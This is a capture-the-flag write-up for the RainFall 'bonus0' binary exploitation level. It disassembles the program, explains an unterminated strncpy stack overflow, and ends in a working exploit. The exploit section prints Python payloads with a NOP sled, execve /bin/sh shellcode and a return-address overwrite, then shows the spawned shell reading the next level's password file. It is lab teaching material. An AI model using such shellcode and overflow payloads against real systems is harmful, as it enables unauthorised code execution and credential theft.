[README](../README.md)
# Bonus 0

```
bonus0@RainFall:~$ ./bonus0
 -
1
 -
2
1 2

bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��� aaaaaaaaaaaaaaaaaaaa���
Segmentation fault (core dumped)
```

## GDB
### Main disassembly
```
0x080485a4 <+0>:     push   %ebp
0x080485a5 <+1>:     mov    %esp,%ebp
0x080485a7 <+3>:     and    $0xfffffff0,%esp
0x080485aa <+6>:     sub    $0x40,%esp
0x080485ad <+9>:     lea    0x16(%esp),%eax
0x080485b1 <+13>:    mov    %eax,(%esp)
0x080485b4 <+16>:    call   0x804851e <pp>
0x080485b9 <+21>:    lea    0x16(%esp),%eax
0x080485bd <+25>:    mov    %eax,(%esp)
0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
0x080485c5 <+33>:    mov    $0x0,%eax
0x080485ca <+38>:    leave
0x080485cb <+39>:    ret
```

### p function
```
0x080484b4 <+0>:     push   %ebp
0x080484b5 <+1>:     mov    %esp,%ebp
0x080484b7 <+3>:     sub    $0x1018,%esp
0x080484bd <+9>:     mov    0xc(%ebp),%eax
0x080484c0 <+12>:    mov    %eax,(%esp)
0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
0x080484d6 <+34>:    mov    %eax,0x4(%esp)
0x080484da <+38>:    movl   $0x0,(%esp)
0x080484e1 <+45>:    call   0x8048380 <read@plt>
0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
0x080484f4 <+64>:    mov    %eax,(%esp)
0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
0x080484fc <+72>:    movb   $0x0,(%eax)
0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
0x08048505 <+81>:    movl   $0x14,0x8(%esp)
0x0804850d <+89>:    mov    %eax,0x4(%esp)
0x08048511 <+93>:    mov    0x8(%ebp),%eax
0x08048514 <+96>:    mov    %eax,(%esp)
0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
0x0804851c <+104>:   leave
0x0804851d <+105>:   ret
```

### pp function
```
0x0804851e <+0>:     push   %ebp
0x0804851f <+1>:     mov    %esp,%ebp
0x08048521 <+3>:     push   %edi
0x08048522 <+4>:     push   %ebx
0x08048523 <+5>:     sub    $0x50,%esp
0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)
0x0804852e <+16>:    lea    -0x30(%ebp),%eax
0x08048531 <+19>:    mov    %eax,(%esp)
0x08048534 <+22>:    call   0x80484b4 <p>
0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
0x08048544 <+38>:    mov    %eax,(%esp)
0x08048547 <+41>:    call   0x80484b4 <p>
0x0804854c <+46>:    lea    -0x30(%ebp),%eax
0x0804854f <+49>:    mov    %eax,0x4(%esp)
0x08048553 <+53>:    mov    0x8(%ebp),%eax
0x08048556 <+56>:    mov    %eax,(%esp)
0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
0x0804855e <+64>:    mov    $0x80486a4,%ebx
0x08048563 <+69>:    mov    0x8(%ebp),%eax
0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
0x0804856d <+79>:    mov    %eax,%edx
0x0804856f <+81>:    mov    $0x0,%eax
0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
0x08048577 <+89>:    mov    %edx,%edi
0x08048579 <+91>:    repnz scas %es:(%edi),%al
0x0804857b <+93>:    mov    %ecx,%eax
0x0804857d <+95>:    not    %eax
0x0804857f <+97>:    sub    $0x1,%eax
0x08048582 <+100>:   add    0x8(%ebp),%eax
0x08048585 <+103>:   movzwl (%ebx),%edx
0x08048588 <+106>:   mov    %dx,(%eax)
0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
0x0804858e <+112>:   mov    %eax,0x4(%esp)
0x08048592 <+116>:   mov    0x8(%ebp),%eax
0x08048595 <+119>:   mov    %eax,(%esp)
0x08048598 <+122>:   call   0x8048390 <strcat@plt>
0x0804859d <+127>:   add    $0x50,%esp
0x080485a0 <+130>:   pop    %ebx
0x080485a1 <+131>:   pop    %edi
0x080485a2 <+132>:   pop    %eb
```

### Program flow
**Main:**
- aligns the stack pointer to a multiple of 16 (and $0xfffffff0,%esp) and reserves space on the stack for local variables.
- loads an address onto the stack and calls the pp function.
- loads another address onto the stack and calls the puts function.

**pp:**
- reserves space on the stack for local variables.
- initializes %eax with the address 0x80486a0 and %edx with the address of a buffer.
- calls function p twice, passing different arguments.
- performs some string operations, copying, and concatenating strings.

**p:**
- reserves space for local variables by subtracting 0x1018 bytes from the stack pointer (%esp).
- moves the value at the address 0xc(%ebp) into the %eax register.
- moves %eax onto the stack ((%esp)) and calls the puts function (puts@plt).
- prepares arguments for the read function (read@plt), setting up the buffer size to 0x1000.
- reads input from standard input (stdin) into the buffer located at -0x1008(%ebp).
- searches for the newline character ('\n') in the buffer using strchr.
- Upon finding the newline character, it replaces it with the null terminator ('\0'), effectively terminating the string.
- Next, it copies the first 0x14 bytes from the buffer to a location specified by the second argument.


The `p` function appears to be vulnerable to a buffer overflow vulnerability. It reads up to `0x1000` (4096) bytes from standard input into a buffer on the stack without checking the size of the input. This can lead to a buffer overflow if the input is larger than the buffer size.

It replaces the `\n` with `\0`, then copies 20 bytes from the buffer
If we enter more characters the string will bot be null terminated.

```
bonus0@RainFall:~$ ./bonus0
 -
1
 -
01234567890123456789
1 01234567890123456789���
```

The program crashes or exhibits unexpected behavior when provided with an input string longer than 20 characters. This behavior confirms the presence of a buffer overflow vulnerability.

## Exploit
```
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

The ASCII representation for the hexadecimal value `0x41336141` is `A3aA`.

In our pattern we have 9 characters before `A3aA`.

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Shellcode used: [Linux/x86 - execve /bin/sh shellcode - 23 bytes](https://shell-storm.org/shellcode/files/shellcode-827.html)

**First payload:**
```
python -c 'print "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
```
- `\x90` (NOP) instructions for padding, to ensure the shellcode is properly aligned.
- Shellcode that spawns a shell (/bin/sh) using the execve syscall. This shellcode is written in assembly and performs the following actions:
    - Zeroes out the `%eax` register (`\x31\xc0`).
    - Pushes null bytes onto the stack (`\x50`).
    - Pushes the string `"/bin/sh"` onto the stack (`\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e`).
    - Copies the pointer to the string `"/bin/sh"` into `%ebx`, `%ecx`, and `%edx` registers (`\x89\xe3\x89\xc1\x89\xc2`).
    - Sets %eax to 0x0b, indicating the execve syscall (`\xb0\x0b`).
    - Invokes the syscall (`\xcd\x80`).

**Second payload:**
```
python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7'
```
- 9 bytes of padding (A characters).
- The little-endian representation of the address (\xd0\xe6\xff\xbf) to overwrite the return address.
- 7 bytes of padding (A characters) to reach the 20 bytes

**Execution:**
```
bonus0@RainFall:~$ (python -c 'print "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0
 -
 -
��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����AAAAAAA���

whoami
bonus1
pwd
/home/user/bonus0
cd ../bonus1
ls -a
.  ..  .bash_logout  .bashrc  .pass  .profile  bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```